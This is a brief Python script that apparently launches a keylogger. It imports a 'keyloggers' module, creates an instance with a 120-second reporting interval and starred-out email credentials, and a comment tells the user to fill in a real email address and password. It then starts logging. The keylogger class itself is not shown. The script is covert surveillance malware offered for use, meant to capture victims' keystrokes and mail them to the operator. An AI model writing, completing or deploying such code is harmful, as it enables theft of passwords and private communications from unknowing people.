#!usr/bin/env python
import keyloggers

my_keylogger = keyloggers.Keylogger(120, "****" , "****") #use real email and pass in the star field
#120 sec
#my_keylogger is a instance of the keylogger class
my_keylogger.start()
